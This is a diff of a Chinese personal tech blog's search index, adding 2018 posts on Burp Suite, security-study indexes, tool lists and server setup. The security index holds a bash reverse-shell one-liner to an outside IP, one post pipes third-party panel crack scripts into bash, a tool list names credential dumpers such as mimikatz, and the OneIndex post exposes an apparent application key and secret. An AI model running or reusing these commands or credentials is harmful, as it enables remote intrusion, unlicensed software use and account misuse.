@@ -1,6 +1,88 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[destoon漏洞利用]]></title>
+    <url>%2F2018%2F11%2F19%2Ftopic%2Fsafe%2Fdestoon-vul.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
+    <title><![CDATA[Burpsuite安装和使用]]></title>
+    <url>%2F2018%2F11%2F19%2Ftopic%2Fsafe%2Ftools-burpsuite-usage.html</url>
+    <content type="text"><![CDATA[Burp Suite是进行Web应用安全测试集成平台。它的各种工具无缝地工作在一起，以支持整个测试过程中，从最初的映射和应用程序的安全性分析，通过发现和利用安全漏洞。 一、安装burpsuiteburpsuite目前最新版是v1.7.36,但是我们以安装破解版为准：百度网盘 破解方法：请参考最下安装文档，略过（先打开burp-loader-keygen.jar） 二、基础使用2.1 代理配置请参考最下面的文档，略过。 2.2 证书安装 访问网站http://burp/, 点击右上按钮导出通用证书。安装的时候选择【受信任的根证书颁发机构】 导出google证书： 点击【Proxy】-【Options】 在【Proxy Listeners】下的 【Import/Export CA certificate】 选择【Export】 -》 【Certificate in DER format】；另存为google.cer 在google浏览器配置中搜索ssl，导入到 【受信任的根证书颁发机构】中 三、高阶使用参考文章 安装Burpsuite1.7.31 Burpsuite实战指南 burpsuite实战文章 https://fly8wo.github.io/2018/08/17/BurpSuite%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[2018-11-16 Think of Fullstack]]></title>
+    <url>%2F2018%2F11%2F16%2Fithink%2F20181116-ithink-fullstack.html</url>
+    <content type="text"><![CDATA[阅读了下Phodal’s Idea实战指南，非常佩服这种技术男工作和学习的点滴都记录下来。反观我这就比较乱了，确实需要整理一波，不然到后面自己都不想回来看这里的技术文章哈。 分析了下，我这边的知识体系分散而且乱，内容的结构比较差。内容实际可以参考ibm上面的一些技术文章，很可惜写类似这样的文件是相当耗时间的。退而求之，每周只写一篇高质量的文章，并且分享这些文章到主流的一些平台也是可以的，剩下的哪些技术文章就提提要点即可了。 主要是时间和知识框架，时间的话主要是每天分配多少时间合理以及坚持每天把这些实际的内容记录下来。 最后 不要将自己圈在一个领域，不要做井底之蛙。 弄php将近4年了，一直没有好好的取扩展其他语言，现在python/golang/javascript将是接下来几个月要好好学习的对象了。 在此，共勉。]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+      <tags>
+        <tag>feed</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[安全研究]]></title>
+    <url>%2F2018%2F11%2F16%2Ftopic%2Fsafe%2Findex.html</url>
+    <content type="text"><![CDATA[介绍参考的索引：https://wangyihang.gitbooks.io/awesome-web-security/ 常用工具 开源仓库 优秀文章 常见漏洞 /etc/passwd 文件包含 文件上传 SQL注入 XSS SSRF CSRF 命令代码执行 敏感信息泄露 随机数安全 代码审计 常用工具 书籍 渗透测试 CTF 搅屎 流量操控技术 主机发现 内网中间人 一句话木马 反弹 shell bash -c ‘bash -i &amp;&gt;/dev/tcp/8.8.8.8/8888 0&gt;1’]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+      <tags>
+        <tag>mac</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[安全利器]]></title>
+    <url>%2F2018%2F11%2F16%2Ftopic%2Fsafe%2Fhack-tools.html</url>
+    <content type="text"><![CDATA[综合工具 BurpSuite 爆破 cheetch patator 社会工程学工具 ccupp cupp 子域名枚举工具 subDomainBrute 密码搜集工 LaZagne mimikatz_trunk wce 参考 https://wangyihang.gitbooks.io/awesome-web-security/content/tools/&gt;]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+      <tags>
+        <tag>mac</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[cnxScan项目]]></title>
+    <url>%2F2018%2F11%2F16%2Fproject%2FcnxScan.html</url>
+    <content type="text"><![CDATA[cnxScan是一个开源的url采集器，有多种采集模式可选，timeline如下 2018年11月16日：项目构思 初期功能 通过scapy设定关键字，爬取百度的热门关键字，可以设定关键字深度及最大关键字数量]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+      <tags>
+        <tag>feed</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[宝塔面板安装配置记]]></title>
+    <url>%2F2018%2F11%2F11%2Flinux%2Fbt-panel-install.html</url>
+    <content type="text"><![CDATA[一、宝塔安装和破解1.1 宝塔6的安装和破解 暂时只支持centos 7+的系统 123456789## 安装bt 6screen -S btyum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.shcurl http://download.bt.cn/install/update6.sh|bash # 升级专业版## 宝塔wget https://github.com/madlifer/btpanelv6.1_crack/releases/download/1/crack.sh &amp;&amp; bash crack.sh 1.2 宝塔5.9 的安装和破解 可以支持大部分linux系统 5.9 破解1会替换当前面板内容，注意使用 123wget -N --no-check-certificate -O install.sh https://cdn.cheshirex.com/uploads/soft/btpanel/install-ubuntu.sh &amp;&amp; bash install.shwget -N --no-check-certificate https://cdn.cheshirex.com/uploads/soft/btpanel/bt_Creak.sh &amp;&amp; chmod 755 bt_Creak.sh &amp;&amp; bash bt_Creak.sh # 一键开心版 该脚本仅仅是将原来的panel文件夹重命名为panel.bak ，再下载授权的panel文件，如果需要切回原版，仅需要将文件夹pane.bak恢复即可。panel的路径是/www/server/panel 二、宝塔基础命令使用123/etc/init.d/bt stop|start|restart # 常用操作/etc/init.d/bt stop &amp;&amp; chkconfig --del bt &amp;&amp; rm -f /etc/init.d/bt &amp;&amp; rm -rf /www/server/panel# 卸载宝塔cat /www/server/panel/data/port.pl # 查看当前端口 修改面板端口，如要改成8881（centos 6 系统） 1234echo '8881' &gt; /www/server/panel/data/port.pl &amp;&amp; /etc/init.d/bt restartiptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 8881 -j ACCEPTservice iptables saveservice iptables restart]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[ss-panel安装配置教程系列(三) - SS服务端对接]]></title>
+    <url>%2F2018%2F11%2F11%2Fsspanel%2Fsspanel-ss-install.html</url>
+    <content type="text"><![CDATA[123456789101112131415161718192021## 安装 libsodiumapt-get install build-essential wget -ywget https://github.com/jedisct1/libsodium/releases/download/1.0.10/libsodium-1.0.10.tar.gztar xf libsodium-1.0.10.tar.gz &amp;&amp; cd libsodium-1.0.10./configure &amp;&amp; make -j2 &amp;&amp; make installldconfig## 安装SSRapt-get install python-pip git -ypip install cymysqlcd ..git clone -b manyuser https://github.com/glzjin/shadowsocks.gitcd shadowsockschmod +x *.sh# 配置程序cp apiconfig.py userapiconfig.pycp config.json user-config.jsonvi userapiconfig.py 参考 搭建 sspanel v3 魔改版记录]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[OneIndex搭建OneDrive个人文件服务]]></title>
+    <url>%2F2018%2F11%2F10%2Ftools%2Fonedrive-for-oneIndex.html</url>
+    <content type="text"><![CDATA[准备内容： 申请5T教育用的OneDrive空间 免费域名 免费服务器： now部署12345npm install -g now # 如果提示警告错误请尝试执行以下命令安装: npm i -g --unsafe-perm nownow logingit clone https://github.com/malaohu/oneindex.git -b now-sh # 安装oneindexcd oneindex 接下来要配置文件 ./now.json： 1234567&#123; "type": "docker", "version": 1, "features": &#123; "cloud": "v1" &#125;&#125; 1234now # 访问https://zeit.co/dashboard 查看安装状态 ，执行now时有返回类似这样的https://oneindex-ohbk8phkc.now.sh 地址now scale oneindex-ohbk8phkc.now.sh 1 # 让docker不重启now alias oneindex-ohbk8phkc.now.sh z7 # 取别名到 z7.now.shnow alias oneindex-ohbk8phkc.now.sh nowsh.oneindex.cc # 绑定域名 OneDrive应用 上https://apps.dev.microsoft.com/portal/register-app 申请应用key2059123f-f815-4dd2-993f-5afbbad0935b kflDEVL9515|+vorpYGF6#;eirqnN6-+ipBNQALZ8524@+]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[2018-11-09 关于请教]]></title>
+    <url>%2F2018%2F11%2F09%2Fithink%2F20181109-ithink-ask-question.html</url>
+    <content type="text"><![CDATA[早上注意力分散，先看了菲电信短信优惠码，有了弄全球电信多国语言版指导书和汇率离线参考的应用接下来又看了离线线程控制扫描器的架构、开源cms的一些漏洞。总而言之太乱了思维，没法专一。那么在这里先收集好我的一些想法 各国电信优惠指导app 离线汇率换算app，联网时可看实时汇率 用队列架构扫描集群。。 漏洞feed全文输出工具开发 开发工具下载镜像站：构思 上面这些权当记录下来，可能已经有对应的工具了，而且时间/精力/能力有限，弄好目前的先把！ 今日任务 熟悉安全渗透的流程和原理：使用phpmywind扫站点，并加以利用漏洞 、部署dvwa本地渗透环境 学习python基础，作脑图导航，避免忘记。工具使用xmind8进行 学习小马的制作，开始利用小马去探测线上的一些漏洞，归纳总结 学习英文，生活常用的英文&amp; 技术相关的文章、特别是安全相关的专业英文词汇 过程蒂法蒂法 总结. Summary]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[主流源码研究列表]]></title>
+    <url>%2F2018%2F11%2F09%2Ftopic%2Fsafe%2Fopen-source-system.html</url>
+    <content type="text"><![CDATA[参考源码量： http://down.chinaz.com/class/3_hits_desc_1.htm http://down.chinaz.com/class/2_hits_desc_1.htm http://down.chinaz.com/class/216_hits_desc_1.htm http://xiazai.zol.com.cn/homepage_soft_index/homepage_page_1.html http://www.mycodes.net/7/ https://www.chanzhi.org/ 源码 名称 类型 语言(版本) 说明 备注 appcms CMS PHP 5.* 开源应用下载器 maccms CMS PHP 电影CMS类开源程序 最新版 v10+ TWCMS CMS PHP 通王CMS v2.0教程 禅知 企业站 PHP 深喉咙CMS 企业建站 PHP f废弃 axublog 博客 PHP5.x 开源静态博客生产系统 海洋CMS 电影 PHP 永久免费并开源的影视建站程序 6.x duomicms 影视 PHP duomicms影视管理系统 PhpMyAdmin 工具 php php数据库管理工具 PageAdmin 企业 .Net 政府/企业站 v3.0 ## ## ## ##]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[2018-11-08 关于开发的想法]]></title>
     <url>%2F2018%2F11%2F08%2Fithink%2F20181108-ithink-about-independent-developer.html</url>
     <content type="text"><![CDATA[来菲差不多2周了，一直没能抽空出来写自己的收获乃至感悟，这个跟之前说来菲每天写一篇总结相违。同样的，很久没有自己写总结，文笔生疏了，亟需调整，而且可以顺便练练书面表达哈。 非常怀恋当时在游戏公司的日子，出来后非常感恩之前领导对我的栽培。这些也是成长的一个过程吧，但出来之后毕竟好很多了，现在有更多的时间去独立思考。 时间有点晚了，用程序猿思维弄几个流程先，待到周日再来个想法杂烩。 今天的收获： 通过网站SideIdea了解到india独立开发者的一些创业过程，有很多新的想法想要去落实，二现在，用更多的精力好好活在当下！ 了解python的一些基础用法但还不够，晚上还需要多加抽时间和精力去完善python的知识体系 研究漏洞。目前放弃weblogic相关的研究，多走asp、php常用的漏洞。目前最主要还是提取webshell漏洞，最好的研究方法就是百度搜索波菜相关去逆向分析吧 目光不仅仅满足于现状，但现在的东西又做不了完美，怎么办？sideidea有个想法感触非常深： 其次，我在之前的工作里（以及大学期间）过度追求完美，我会长时间工作。要求员工每天打至少 100 个销售电话。这会把人累垮（包括我自己） (burn out）。所以现在意识到『做完』比『做完美』更重要。 think about mac、手机下载相关书籍同步学习，目前目标书籍有:《Python核心编程（第3版）》、《跟老齐学Python》、《Python学习手册(第4版)》和《Python爬虫开发与项目实战》 手稿笔记要跟上，以免遗忘（艾宾浩遗忘曲线了解下） dvwa渗透环境的搭建和测试（未完成 5%） 最后发现十几分钟写流水账也挺快的，这个过程有很多自己的思考，确实是一个可以培养的习惯，以后发扬光大吧！]]></content>
@@ -13,7 +95,7 @@
   <entry>
     <title><![CDATA[IDE快捷键列表]]></title>
     <url>%2F2018%2F11%2F08%2Ftools%2Fide-hotkey-list.html</url>
-    <content type="text"><![CDATA[说明 :arrow_down: ：下载:arrow_down: ⌘ : Mac 下从Command / Windows下的win键 ⌥Option： option键，mac专有, win下一般是Alt ⇧Shift： Shift键 ✲ ⎈ ⌃ ✳: ctrl （U+2388）, mac中用⌃表示 Alt: Alt按键 Tab↹ : Tab按键 ❖： ⏎↩⮰： ⬅ ➡ ⬆ ⬇：↑/↓/←/→ ⎌： 撤销 ⌫： ←Backspace: 删除按键 Esc：Esc键 Delete/Del: Delete按键 PgDn,PgUp: Home 二、常用快捷键 IDE 通用 IDEA VS CODE Sublime Text 打开文件 Ctrl+O 设置 Ctrl+, Shift+Ctrl+S Ctrl+, 快速打开文件 Ctrl+P 三、替代方案]]></content>
+    <content type="text"><![CDATA[一、按键图标说明 :arrow_down: ：下载:arrow_down: ⌘ : Mac 下从Command / Windows下的win键 ⌥Option： option键，mac专有, win下一般是Alt ⇧Shift： Shift键 ✲ ⎈ ⌃ ✳: ctrl （U+2388）, mac中用⌃表示 Alt: Alt按键 Tab↹ : Tab按键 ❖： ⏎↩⮰： ⬅ ➡ ⬆ ⬇：↑/↓/←/→ ⎌： 撤销 ⌫： ←Backspace: 删除按键 Esc：Esc键 Delete/Del: Delete按键 PgDn,PgUp: Home 二、常用快捷键Window下快捷键对比 IDE 通用 IDEA VS CODE Sublime Text 打开文件 Ctrl+O 新建文件 Ctrl+N 打开/影藏侧边栏 Ctrl+B 设置 Ctrl+, Shift+Ctrl+S Ctrl+, 快速打开文件 Ctrl+N Ctrl+P 最近打开文件 Ctrl+E 切换项目 Ctrl+R 行数跳转 Ctrl+G Ctrl+G Ctrl+G 打开终端 Ctrl+J 执行文件 Ctrl+B 编译文件 Ctrl+Shift+B 返回光标上次位置 Ctrl+U 当前文件内容搜索 Ctrl+I 当前文件内容搜索 Ctrl+F 当前文件替换 Ctrl+H 全局搜索/替换 Ctrl+Shift+F 字符串多选 Ctrl+D Alt+J Ctrl+D Ctrl+D 选择多行 Ctrl+Alt+↑↓ 代码格式话 Ctrl+Alt+L 三、常用编辑器配置3.1 vscode123456&#123; // 设置自动换行 "editor.wordWrap": "on", "git.autofetch": true&#125;]]></content>
   </entry>
   <entry>
     <title><![CDATA[Docker Laravel实战]]></title>
@@ -60,7 +142,7 @@
   <entry>
     <title><![CDATA[ss-panel安装配置教程系列(一) - 邮件配置]]></title>
     <url>%2F2018%2F09%2F22%2Fsspanel%2Fsspanel-email-setting.html</url>
-    <content type="text"><![CDATA[目前sspanel发邮件模式支持smtp、mailgun和sendgrid，下面说说这些邮件的设置以及注意的事项等。 一、smtp使用smtp发送邮件先要在配置中设置：$System_Config[&#39;mailDriver&#39;] = &#39;smtp&#39;; // mailgun or smtp or sendgrid 选择发送邮件的方式 1.1 使用qq邮箱发送方法 去qq邮箱开启smtp服务 开启这两个服务 生成授权码一会要用 回到配置文件中这样进行设置 12345678// smtp$System_Config['smtp_host'] = 'smtp.qq.com';$System_Config['smtp_username'] = '你的qq号@qq.com';$System_Config['smtp_port']= '465';$System_Config['smtp_name'] = '发送名';$System_Config['smtp_sender'] = '你的qq号@qq.com';$System_Config['smtp_passsword'] = '刚才生成的授权码';$System_Config['smtp_ssl'] = 'true'; 1.2 outlook设置1.3 Google邮件服务设置 gcp封锁了所有端口25，465,587(自家邮箱这个端口没封) gcp封了所有除自家（gmail）以外的所有邮箱 使用gcp发邮箱必须使用gmail邮箱，而且必须使用587端口 我之前gmail为啥不行原来是使用了465端口的原因。 如果使用587端口，是除了gmail以外的邮箱照样失败，587端口gcp只给自家邮箱放开了 如果你服务器端口没被封25，465，587，那你用哪个邮箱都无所谓 接下来正式开始gcp gmail的教程 1：进入gmail跟qq一样把smtp打开，都大同小异就不一一复述了 gmail如下填即可，一定要记住使用587端口（gcp） 12345678// smtp$System_Config['smtp_host'] = 'smtp.gmail.com';$System_Config['smtp_username'] = '你的gmail邮箱@gmail.com';$System_Config['smtp_port'] = '587';$System_Config['smtp_name'] = '发送名与qq邮箱一样';$System_Config['smtp_sender'] = '你的gmail邮箱@gmail.com';$System_Config['smtp_passsword'] = '你的gmail邮箱密码';$System_Config['smtp_ssl'] = 'true'; 1.4 mailgun使用smtp发送邮件12345678// smtp$System_Config['smtp_host'] = 'smtp.mailgun.org';$System_Config['smtp_username'] = 'mailgun smtp的邮箱';$System_Config['smtp_port'] = '2525'; // 必须得是2525其他都不可以！！！！$System_Config['smtp_name'] = '就是你网站的名字吧';$System_Config['smtp_sender'] = 'mailgun smtp的邮箱';$System_Config['smtp_passsword'] = '你的mailgun Smtp 密码';$System_Config['smtp_ssl'] = 'false'; // 必须得是false不知道为什么感觉很怪 1.5 Sendgrid 使用smtp发送邮件控制面板左边的Sender Authentication，按照提示在DNS解析商那边添加CNAME验证域名 1234567$System_Config['smtp_host'] = 'smtp.sendgrid.net';$System_Config['smtp_username'] = 'sendgrid用户名（就是登录sendgrid网页时候填的那个）';$System_Config['smtp_port'] = '465';$System_Config['smtp_name'] = '填下面你填在Reply to的邮箱';$System_Config['smtp_sender'] = '就随便起个名（比如admin.rutou.com）';$System_Config['smtp_passsword'] = 'sendgrid密码（就是你登陆sendgrid网页的密码）';$System_Config['smtp_ssl'] = 'true'; 二、mailgun三、sendgrid四、服务器设置注意事项4.1 google cloud 配置注意事项]]></content>
+    <content type="text"><![CDATA[状态： mailgun不稳定、使用gcp邮件不稳定 目前sspanel发邮件模式支持smtp、mailgun和sendgrid，下面说说这些邮件的设置以及注意的事项等。 一、smtp使用smtp发送邮件先要在配置中设置：$System_Config[&#39;mailDriver&#39;] = &#39;smtp&#39;; // mailgun or smtp or sendgrid 选择发送邮件的方式 1.1 使用qq邮箱发送方法 去qq邮箱开启smtp服务 开启这两个服务 生成授权码一会要用 回到配置文件中这样进行设置 12345678// smtp$System_Config['smtp_host'] = 'smtp.qq.com';$System_Config['smtp_username'] = '你的qq号@qq.com';$System_Config['smtp_port']= '465';$System_Config['smtp_name'] = '发送名';$System_Config['smtp_sender'] = '你的qq号@qq.com';$System_Config['smtp_passsword'] = '刚才生成的授权码';$System_Config['smtp_ssl'] = 'true'; 1.2 outlook设置1.3 Google邮件服务设置 gcp封锁了所有端口25，465,587(自家邮箱这个端口没封) gcp封了所有除自家（gmail）以外的所有邮箱 使用gcp发邮箱必须使用gmail邮箱，而且必须使用587端口 我之前gmail为啥不行原来是使用了465端口的原因。 如果使用587端口，是除了gmail以外的邮箱照样失败，587端口gcp只给自家邮箱放开了 如果你服务器端口没被封25，465，587，那你用哪个邮箱都无所谓 接下来正式开始gcp gmail的教程 1：进入gmail跟qq一样把smtp打开，都大同小异就不一一复述了 gmail如下填即可，一定要记住使用587端口（gcp） 12345678// smtp$System_Config['smtp_host'] = 'smtp.gmail.com';$System_Config['smtp_username'] = '你的gmail邮箱@gmail.com';$System_Config['smtp_port'] = '587';$System_Config['smtp_name'] = '发送名与qq邮箱一样';$System_Config['smtp_sender'] = '你的gmail邮箱@gmail.com';$System_Config['smtp_passsword'] = '你的gmail邮箱密码';$System_Config['smtp_ssl'] = 'true'; 1.4 mailgun使用smtp发送邮件12345678// smtp$System_Config['smtp_host'] = 'smtp.mailgun.org';$System_Config['smtp_username'] = 'mailgun smtp的邮箱';$System_Config['smtp_port'] = '2525'; // 必须得是2525其他都不可以！！！！$System_Config['smtp_name'] = '就是你网站的名字吧';$System_Config['smtp_sender'] = 'mailgun smtp的邮箱';$System_Config['smtp_passsword'] = '你的mailgun Smtp 密码';$System_Config['smtp_ssl'] = 'false'; // 必须得是false不知道为什么感觉很怪 1.5 Sendgrid 使用smtp发送邮件控制面板左边的Sender Authentication，按照提示在DNS解析商那边添加CNAME验证域名 1234567$System_Config['smtp_host'] = 'smtp.sendgrid.net';$System_Config['smtp_username'] = 'sendgrid用户名（就是登录sendgrid网页时候填的那个）';$System_Config['smtp_port'] = '465';$System_Config['smtp_name'] = '填下面你填在Reply to的邮箱';$System_Config['smtp_sender'] = '就随便起个名（比如admin.rutou.com）';$System_Config['smtp_passsword'] = 'sendgrid密码（就是你登陆sendgrid网页的密码）';$System_Config['smtp_ssl'] = 'true'; 二、mailgun三、sendgrid四、服务器设置注意事项4.1 google cloud 配置注意事项]]></content>
   </entry>
   <entry>
     <title><![CDATA[ss-panel安装配置教程系列]]></title>
@@ -318,9 +400,9 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[策略模式]]></title>
-    <url>%2F2018%2F04%2F04%2Fphp%2Fphp-design-patterns-strategy.html</url>
-    <content type="text"><![CDATA[策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境，这种模式就是策略模式 实际应用举例，假如一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有广告位展示不同的广告 使用策略模式可以实现 Ioc，依赖倒置、控制反转 代码实现和使用控制反转策略模式 依赖到置。 解耦。[ 查看全文 ]]]></content>
+    <title><![CDATA[数据对象映射模式]]></title>
+    <url>%2F2018%2F04%2F04%2Fphp%2Fphp-design-patterns-data-mapper.html</url>
+    <content type="text"><![CDATA[数据对象映射模式，是将对象和数据存储映射起来，对一个对象的操作会映射为对数据存储的操作。 在代码中实现数据对象映射模式，我们将实现一个 ORM 类，将复杂的 SQL 语句映射成对象属性的操作。 结合使用数据对象映射模式，工厂模式，注册器模式]]></content>
       <categories>
         <category>php</category>
       </categories>
@@ -330,9 +412,9 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[数据对象映射模式]]></title>
-    <url>%2F2018%2F04%2F04%2Fphp%2Fphp-design-patterns-data-mapper.html</url>
-    <content type="text"><![CDATA[数据对象映射模式，是将对象和数据存储映射起来，对一个对象的操作会映射为对数据存储的操作。 在代码中实现数据对象映射模式，我们将实现一个 ORM 类，将复杂的 SQL 语句映射成对象属性的操作。 结合使用数据对象映射模式，工厂模式，注册器模式]]></content>
+    <title><![CDATA[策略模式]]></title>
+    <url>%2F2018%2F04%2F04%2Fphp%2Fphp-design-patterns-strategy.html</url>
+    <content type="text"><![CDATA[策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境，这种模式就是策略模式 实际应用举例，假如一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有广告位展示不同的广告 使用策略模式可以实现 Ioc，依赖倒置、控制反转 代码实现和使用控制反转策略模式 依赖到置。 解耦。[ 查看全文 ]]]></content>
       <categories>
         <category>php</category>
       </categories>
@@ -618,7 +700,7 @@
   <entry>
     <title><![CDATA[feed订阅配置]]></title>
     <url>%2F2018%2F01%2F04%2Ftools%2Ffeed-rss-setting.html</url>
-    <content type="text"><![CDATA[mark: 主流RSS订阅器参数配置：1234Feedly: https://www.feedly.com/home#subscription/feed/%s 修改：https://feedly.com/i/subscription/feed/%sinoreader: http://www.inoreader.com/feed/%s鲜果订阅：http://xianguo.com/subscribe?url=%s （已废） 常用系统rss地址解析 wordpress: 域名+ /?feed=rss2 hexo: mblog: discuz:]]></content>
+    <content type="text"><![CDATA[mark: 主流RSS订阅器参数配置：1234Feedly: https://www.feedly.com/home#subscription/feed/%s 修改：https://feedly.com/i/subscription/feed/%sinoreader: http://www.inoreader.com/feed/%s鲜果订阅：http://xianguo.com/subscribe?url=%s （已废） 常用系统rss地址解析 wordpress: 域名+ /?feed=rss2 hexo: mblog: discuz: emlog: /rss.php]]></content>
       <categories>
         <category>tools</category>
       </categories>
@@ -674,14 +756,6 @@
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[PHP设计模式]]></title>
-    <url>%2F2017%2F12%2F22%2Fphp%2Fphp-design-pattern.html</url>
-    <content type="text"><![CDATA[我们常用的php设计模式有: 单例模式) 单例模式) Interpreter(解释器模式)Factory(工厂模式)Facade(外观模式)Decorator(装饰模式)Builder(建造者模式)Adapter(适配器模式)Template (模板模式)Command(命令模式)Singleton(单例模式)单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例，这个类我们称之为单例类。 单例模式的要点有三个： 是某个类只能有一个实例； 是它必须自行创建这个实例； 是它必须自行向整个系统提供这个实例。 为什么要使用PHP单例模式？ 多数 人都是从单例模式的字面上的意思来理解它的用途, 认为这是对系统资源的节省, 可以避免重复实例化, 是一种”计划生育”. 而PHP每次执行完页面都是会从内存中清理掉所有的资源. 因而PHP中的单例实际每次运行都是需要重新实例化的, 这样就失去了单例重复实例化的意义了. 单单从这个方面来说, PHP的单例的确有点让各位失望. 但是单例仅仅只有这个功能和应用吗? 答案是否定的,我们一起来看看。 php的应用主要在于数据库应用, 所以一个应用中会存在大量的数据库操作, 在使用面向对象的方式开发时(废话), 如果使用单例模式, 则可以避免大量的new 操作消耗的资源。 如果系统中需要有一个类来全局控制某些配置信息, 那么使用单例模式可以很方便的实现. 这个可以参看zend Framework的FrontController部分。 在一次页面请求中, 便于进行调试, 因为所有的代码(例如数据库操作类db)都集中在一个类中, 我们可以在类中设置钩子, 输出日志，从而避免到处var_dump, echo。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php /*** 设计模式之单例模式* $_instance必须声明为静态的私有变量* 构造函数和析构函数必须声明为私有,防止外部程序new* 类从而失去单例模式的意义* getInstance()方法必须设置为公有的,必须调用此方法* 以返回实例的一个引用* ::操作符只能访问静态变量和静态函数* new对象都会消耗内存* 使用场景:最常用的地方是数据库连接。 * 使用单例模式生成一个对象后，* 该对象可以被其它众多对象所使用。 */class Example&#123;//保存例实例在此属性中private static $_instance;//构造函数声明为private,防止直接创建对象private function __construct()&#123;echo 'I am Construceted';&#125;//单例方法public static function singleton()&#123;if(!isset(self::$_instance))&#123;$c=__CLASS__;self::$_instance=new $c;&#125;return self::$_instance;&#125; //阻止用户复制对象实例public function __clone()&#123;trigger_error('Clone is not allow' ,E_USER_ERROR);&#125;function test()&#123;echo("test");&#125;&#125;// 这个写法会出错，因为构造方法被声明为private$test = new Example;// 下面将得到Example类的单例对象$test = Example::singleton();$test-&gt;test();// 复制对象将导致一个E_USER_ERROR.$test_clone = clone $test;?&gt; Observer(观察者模式)Strategy(策略模式)Visitor (访问者模式)Memento (备忘录模式)Prototype (原型模式)Mediator (中介者模式)FlyWeight (享元模式)Chain Of Responsibility (职责链模式)Bridge (桥接模式)Proxy (代理模式)State (状态模式)Composite (组合模式)Interator (迭代器模式) 解释 参考文章 图说设计模式 php设计模式 (总结) PHP单例模式（转载） PHP设计模式笔记：使用PHP实现单例模式]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-  </entry>
-  <entry>
     <title><![CDATA[PHP使用SQLite扩展]]></title>
     <url>%2F2017%2F12%2F22%2Fphp%2Fphp-sqlite-usage.html</url>
     <content type="text"><![CDATA[开启sqlite一. Windows下开启sqlite: extension=php_pdo.dll extension=php_sqlite.dll 二. Unix/Linux下开启sqlite: 是编译的时候添加: --with-sqlite=shared 在安装后添加的编译: tar xvf php-your.version.here.tar.gz cd php-your.version.here/ext/sqlite/ phpize ./configure make make install ##]]></content>
@@ -690,9 +764,17 @@
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[PHP使用redis]]></title>
-    <url>%2F2017%2F12%2F22%2Fphp%2Fphp-redis-usage.html</url>
-    <content type="text"><![CDATA[Redis简介: 是一个key-value存储系统,和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集 合)。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步. window下安装使用redis需要文件: PHP官方Redis扩展下载 win下Redis程序(32位,在目录/bin中) Win下Redis程序(64位) 解压下redis,有如下文件: redis-server.exe：服务程序 redis-check-dump.exe：本地数据库检查 redis-check-aof.exe：更新日志检查 redis-benchmark.exe：性能测试，用以模拟同时由N个客户端发送M个 SETs/GETs 查询 (类似于 Apache 的ab 工具). windows下 使用redis安装好redis后可以在cmd中运行{dir}\redis-server.exe运行redis服务.运行后redis服务端后,可以在cmd通过redis-cli.exe -h 127.0.0.1 -p 6379来运行客户端 简单测试: 1234redis 127.0.0.1:6379&gt; set mykey somevalueOKredis 127.0.0.1:6379&gt; get mykey"somevalue" 如何添加值到list: 123456789101112131415redis 127.0.0.1:6379&gt; lpush mylist val1(integer) 1redis 127.0.0.1:6379&gt; lpush mylist val2(integer) 2redis 127.0.0.1:6379&gt; lpush mylist val3(integer) 3redis 127.0.0.1:6379&gt; lpush mylist val4(integer) 4redis 127.0.0.1:6379&gt; lrange mylist 0 -1 1&gt; val1 2&gt; val2 3&gt; val3 4&gt; val4redis 127.0.0.1:6379&gt; rpop mylist "val1" redis-benchmark.exe：性能测试，用以模拟同时由N个客户端发送M个 SETs/GETs 查询 (类似于 Apache 的 ab 工具). 1D:\wnmp\redis&gt;redis-benchmark -n 100000 –c 50 linux下安装使用redis 参考 http://my.oschina.net/lujianing/blog/204103]]></content>
+    <title><![CDATA[PHP正则使用]]></title>
+    <url>%2F2017%2F12%2F22%2Fphp%2Fphp-preg.html</url>
